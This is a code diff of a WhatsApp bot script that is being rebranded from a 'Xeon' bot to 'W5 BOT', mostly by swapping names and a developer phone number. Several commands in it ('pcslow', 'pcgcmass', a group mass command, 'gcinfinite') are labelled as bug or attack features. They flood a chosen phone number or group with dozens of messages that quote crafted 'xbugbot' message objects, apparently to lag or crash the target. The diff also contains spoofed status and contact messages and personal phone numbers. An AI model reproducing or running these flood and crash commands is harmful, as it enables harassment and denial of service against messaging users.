@@ -14,7 +14,7 @@ const request = require('request')
 const xeontod = require("tod-api")
 const { EmojiAPI } = require("emoji-api")
 const emoji = new EmojiAPI()
-const thiccysapi = require('textmaker-thiccy')
+const thiccysapi = require('w5-textmaker')
 const QrCode = require('qrcode-reader')
 const qrcode = require('qrcode')
 const { buffergif } = require('./lib/myfunc2')
@@ -160,7 +160,7 @@ if (cek == null) return null
 		const fgclink = {key: {participant: "0@s.whatsapp.net","remoteJid": "0@s.whatsapp.net"},"message": {"groupInviteMessage": {"groupJid": "6288213840883-1616169743@g.us","inviteCode": "m","groupName": wm, "caption": `${pushname}`, 'jpegThumbnail': thumb}}}
 		const fvideo = {key: { fromMe: false,participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {}) },message: { "videoMessage": { "title":botname, "h": wm,'seconds': '359996400', 'caption': `${pushname}`, 'jpegThumbnail': thumb}}}
 		const floc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {locationMessage: {name: wm,jpegThumbnail: thumb}}}
-		const fkontak = { key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: `status@broadcast` } : {}) }, message: { 'contactMessage': { 'displayName': ownername, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${ownername},;;;\nFN:${ownername}\nitem1.TEL;waid=916909137213:916909137213\nitem1.X-ABLabel:Mobile\nEND:VCARD`, 'jpegThumbnail': thumb, thumbnail: thumb,sendEphemeral: true}}}
+		const fkontak = { key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: `status@broadcast` } : {}) }, message: { 'contactMessage': { 'displayName': ownername, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${ownername},;;;\nFN:${ownername}\nitem1.TEL;waid=917736807522:917736807522\nitem1.X-ABLabel:Mobile\nEND:VCARD`, 'jpegThumbnail': thumb, thumbnail: thumb,sendEphemeral: true}}}
 	    const fakestatus = {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "imageMessage": {"url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc","mimetype": "image/jpeg","caption": wm,"fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=","fileLength": "28777","height": 1080,"width": 1079,"mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=","fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=","directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69","mediaKeyTimestamp": "1610993486","jpegThumbnail": fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),"scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="}}}
 		
 	
@@ -500,7 +500,7 @@ XeonBotInc.sendMessage(from, {text:`\`\`\`「 Wa.me Link Detected 」\`\`\`\n\n@
 //anti bad words by xeon
 if (antiToxic)
 if (bad.includes(messagesD)) {
-tos = ['Hey, watch your mouth','Never been taught how to speak?','Stop being toxic my friend🤢','Dont be toxic🦄']
+tos = ['Hey, watch your mouth','Never been taught how to speak?','Stop being toxic my friend🤢','Dont be toxic🐱']
 sin =  tos[Math.floor(Math.random() * (tos.length))]
 m.reply(sin)
 if (m.text) {
@@ -1670,7 +1670,7 @@ m.reply(`Chat owner bro, please type .owner`)
 break
   case 'addprem':
 if (!isCreator) throw mess.owner
-if (!q) return m.reply(`Enter the sample number\n\nExample: \n${prefix}${command} 916909137213`)
+if (!q) return m.reply(`Enter the sample number\n\nExample: \n${prefix}${command} 917736807522`)
 if(isNaN(q)) return await m.reply('must be a number')
   if (q.includes(`+`)) return m.reply('Do not use + direct number 9169****')
 prmi = args.join(" ")
@@ -1681,7 +1681,7 @@ break
 case 'delprem':
  case 'dellprem':
 if (!isCreator) throw mess.owner
-  if (!q) return m.reply(`Enter the Number\n\nExample: \n${prefix}${command} 916909137213`)
+  if (!q) return m.reply(`Enter the Number\n\nExample: \n${prefix}${command} 917736807522`)
   if(isNaN(q)) return await m.reply('must be a number')
   if (q.includes(`+`)) return m.reply('Do not use + direct number 9169****')
   prmin = `${q}@s.whatsapp.net`
@@ -3431,7 +3431,10 @@ View list of Messages With ${prefix}listmsg`)
             }
 	    break
 case 'developer': case 'dev': {
-reply(`•CHEEMS BOT DEVELOPER•\n\n\n   ©2021-2022 Xeon Bot Inc.\n\n🦄Dream Guy Xeon\nPm: wa.me/916909137213`)
+reply(`•W5 BOT DEVELOPER•\n\n\n   ©2022-2023 W5 BOT.\n\n
+
+
+WH173 5P1D3R\nPm: wa.me/917736807522`)
 }
             break
 case 'owner': case 'creator': case 'moderator': case 'mod': {
@@ -6558,8 +6561,8 @@ var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "product": {
 "productImage": xeonmess.imageMessage,
 "productId": "99999999999999",
-"title": `Xeon Ezy☣️ ${xeonbutton} ${xeonbutton}`,
-"description": `Xeon Ezy☣️ ${xeonbutton} ${xeonbutton}`,
+"title": `W5 BOT ${xeonbutton} ${xeonbutton}`,
+"description": `W5 BOT ${xeonbutton} ${xeonbutton}`,
 "currencyCode": "INR",
 "footerText": botname,
 "priceAmount1000": "10000000",
@@ -6569,7 +6572,7 @@ var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "retailerId": author,
 "url": websitex
 },
-"businessOwnerJid": "916909137213@s.whatsapp.net",
+"businessOwnerJid": "917736807522@s.whatsapp.net",
 }
 }), { userJid: m.chat, quoted: xeontalog })
 XeonBotInc.relayMessage(m.chat, catalog.message, { messageId: catalog.key.id })
@@ -6620,7 +6623,7 @@ participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "@s.whatsapp.net" } : {
 "fileLength": "64455",
 "pageCount": 1,
 "mediaKey": "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=",
-"fileName": `Xeon Ezy☣️${xeonbrutal(prefix)}`,
+"fileName": `W5 BOT${xeonbrutal(prefix)}`,
 "fileEncSha256": "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk=",
 	}
 }
@@ -6641,64 +6644,64 @@ case 'pcslow': {
                     message: { 
                         "imageMessage": { 
                             "mimetype": "image/jpeg", 
-                            "caption": `🦄ᵈʳᵉᵃᵐ ᵍᵘʸ ˣᵉᵒⁿ⸙xbugbot`,
+                            "caption": `🐱WH173 5P1D3Rxbugbot`,
                             "jpegThumbnail": xpicvirus
                         } 
                     } 
                 }
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"W5 BOT"},{quoted:xeonyh1})
             await sleep(30000)
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"W5 BOT"},{quoted:xeonyh1})
             await sleep(30000)
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"W5 BOT"},{quoted:xeonyh1})
             await sleep(30000)
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"W5 BOT"},{quoted:xeonyh1})
             await sleep(30000)
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"W5 BOT"},{quoted:xeonyh1})
             await sleep(30000)
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"W5 BOT"},{quoted:xeonyh1})
             await sleep(30000)
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"W5 BOT"},{quoted:xeonyh1})
             await sleep(30000)
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"W5 BOT"},{quoted:xeonyh1})
             await sleep(30000)
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"W5 BOT"},{quoted:xeonyh1})
             await sleep(30000)
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"W5 BOT"},{quoted:xeonyh1})
             await sleep(30000)
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"W5 BOT"},{quoted:xeonyh1})
             await sleep(30000)
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"W5 BOT"},{quoted:xeonyh1})
             await sleep(30000)
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"W5 BOT"},{quoted:xeonyh1})
             await sleep(30000)
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"W5 BOT"},{quoted:xeonyh1})
             await sleep(30000)
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"W5 BOT"},{quoted:xeonyh1})
             await sleep(30000)
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"W5 BOT"},{quoted:xeonyh1})
             await sleep(30000)
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"W5 BOT"},{quoted:xeonyh1})
             await sleep(30000)
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"W5 BOT"},{quoted:xeonyh1})
             await sleep(30000)
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"W5 BOT"},{quoted:xeonyh1})
             await sleep(30000)
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"W5 BOT"},{quoted:xeonyh1})
             await sleep(30000)
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"W5 BOT"},{quoted:xeonyh1})
             await sleep(30000)
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"W5 BOT"},{quoted:xeonyh1})
             await sleep(30000)
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"W5 BOT"},{quoted:xeonyh1})
             await sleep(30000)
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"W5 BOT"},{quoted:xeonyh1})
             await sleep(30000)
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"W5 BOT"},{quoted:xeonyh1})
             await sleep(30000)
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"W5 BOT"},{quoted:xeonyh1})
             await sleep(30000)
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"W5 BOT"},{quoted:xeonyh1})
             await sleep(30000)
             }
             break
@@ -6716,64 +6719,64 @@ if (!text) return reply(`${mess.attack}\nExample: ${prefix}pcgcmass 91xxxxxxxxxx
                     message: { 
                         "imageMessage": { 
                             "mimetype": "image/jpeg", 
-                            "caption": `🦄ᵈʳᵉᵃᵐ ᵍᵘʸ ˣᵉᵒⁿ⸙xbugbot`,
+                            "caption": `🐱WH173 5P1D3Rxbugbot`,
                             "jpegThumbnail": xpicvirus
                         } 
                     } 
                 }
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"W5 BOT"},{quoted:pmgcmassxeon})
             await sleep(30000)
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"W5 BOT"},{quoted:pmgcmassxeon})
             await sleep(30000)
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"W5 BOT"},{quoted:pmgcmassxeon})
             await sleep(30000)
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"W5 BOT"},{quoted:pmgcmassxeon})
             await sleep(30000)
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"W5 BOT"},{quoted:pmgcmassxeon})
             await sleep(30000)
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"W5 BOT"},{quoted:pmgcmassxeon})
             await sleep(30000)
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"W5 BOT"},{quoted:pmgcmassxeon})
             await sleep(30000)
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"W5 BOT"},{quoted:pmgcmassxeon})
             await sleep(30000)
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"W5 BOT"},{quoted:pmgcmassxeon})
             await sleep(30000)
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"W5 BOT"},{quoted:pmgcmassxeon})
             await sleep(30000)
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"W5 BOT"},{quoted:pmgcmassxeon})
             await sleep(30000)
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"W5 BOT"},{quoted:pmgcmassxeon})
             await sleep(30000)
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"W5 BOT"},{quoted:pmgcmassxeon})
             await sleep(30000)
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"W5 BOT"},{quoted:pmgcmassxeon})
             await sleep(30000)
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"W5 BOT"},{quoted:pmgcmassxeon})
             await sleep(30000)
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"W5 BOT"},{quoted:pmgcmassxeon})
             await sleep(30000)
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"W5 BOT"},{quoted:pmgcmassxeon})
             await sleep(30000)
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"W5 BOT"},{quoted:pmgcmassxeon})
             await sleep(30000)
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"W5 BOT"},{quoted:pmgcmassxeon})
             await sleep(30000)
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"W5 BOT"},{quoted:pmgcmassxeon})
             await sleep(30000)
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"W5 BOT"},{quoted:pmgcmassxeon})
             await sleep(30000)
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"W5 BOT"},{quoted:pmgcmassxeon})
             await sleep(30000)
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"W5 BOT"},{quoted:pmgcmassxeon})
             await sleep(30000)
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"W5 BOT"},{quoted:pmgcmassxeon})
             await sleep(30000)
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"W5 BOT"},{quoted:pmgcmassxeon})
             await sleep(30000)
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"W5 BOT"},{quoted:pmgcmassxeon})
             await sleep(30000)
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"W5 BOT"},{quoted:pmgcmassxeon})
             await sleep(30000)
             }
             break
@@ -6790,64 +6793,64 @@ if (!text) return reply(`${mess.attack}\nExample: ${prefix}pcgcmass 91xxxxxxxxxx
                     message: { 
                         "imageMessage": { 
                             "mimetype": "image/jpeg", 
-                            "caption": `🦄ᵈʳᵉᵃᵐ ᵍᵘʸ ˣᵉᵒⁿ⸙xbugbot`,
+                            "caption": `🐱WH173 5P1D3R xbugbot`,
                             "jpegThumbnail": xpicvirus
                         } 
                     } 
                 }
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"W5 BOT"},{quoted:gcmassxeon})
             await sleep(30000)
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"W5 BOT"},{quoted:gcmassxeon})
             await sleep(30000)
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"W5 BOT"},{quoted:gcmassxeon})
             await sleep(30000)
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"W5 BOT"},{quoted:gcmassxeon})
             await sleep(30000)
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"W5 BOT"},{quoted:gcmassxeon})
             await sleep(30000)
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"W5 BOT"},{quoted:gcmassxeon})
             await sleep(30000)
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"W5 BOT"},{quoted:gcmassxeon})
             await sleep(30000)
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"W5 BOT"},{quoted:gcmassxeon})
             await sleep(30000)
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"W5 BOT"},{quoted:gcmassxeon})
             await sleep(30000)
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"W5 BOT"},{quoted:gcmassxeon})
             await sleep(30000)
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"W5 BOT"},{quoted:gcmassxeon})
             await sleep(30000)
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"W5 BOT"},{quoted:gcmassxeon})
             await sleep(30000)
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"W5 BOT"},{quoted:gcmassxeon})
             await sleep(30000)
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"W5 BOT"},{quoted:gcmassxeon})
             await sleep(30000)
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"W5 BOT"},{quoted:gcmassxeon})
             await sleep(30000)
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"W5 BOT"},{quoted:gcmassxeon})
             await sleep(30000)
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"W5 BOT"},{quoted:gcmassxeon})
             await sleep(30000)
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"W5 BOT"},{quoted:gcmassxeon})
             await sleep(30000)
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"W5 BOT"},{quoted:gcmassxeon})
             await sleep(30000)
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"W5 BOT"},{quoted:gcmassxeon})
             await sleep(30000)
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"W5 BOT"},{quoted:gcmassxeon})
             await sleep(30000)
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"W5 BOT"},{quoted:gcmassxeon})
             await sleep(30000)
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"W5 BOT"},{quoted:gcmassxeon})
             await sleep(30000)
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"W5 BOT"},{quoted:gcmassxeon})
             await sleep(30000)
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"W5 BOT"},{quoted:gcmassxeon})
             await sleep(30000)
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"W5 BOT"},{quoted:gcmassxeon})
             await sleep(30000)
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"W5 BOT"},{quoted:gcmassxeon})
             await sleep(30000)
             reply(mess.success)
             break
@@ -6864,38 +6867,38 @@ if (!text) return reply(`${mess.attack}\nExample: ${prefix}pcgcmass 91xxxxxxxxxx
                     message: { 
                         "imageMessage": { 
                             "mimetype": "image/jpeg", 
-                            "caption": `🦄ᵈʳᵉᵃᵐ ᵍᵘʸ ˣᵉᵒⁿ⸙xbugbot`,
+                            "caption": `🐱WH173 5P1D3Rxbugbot`,
                             "jpegThumbnail": xpicvirus
                         } 
                     } 
                 }
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
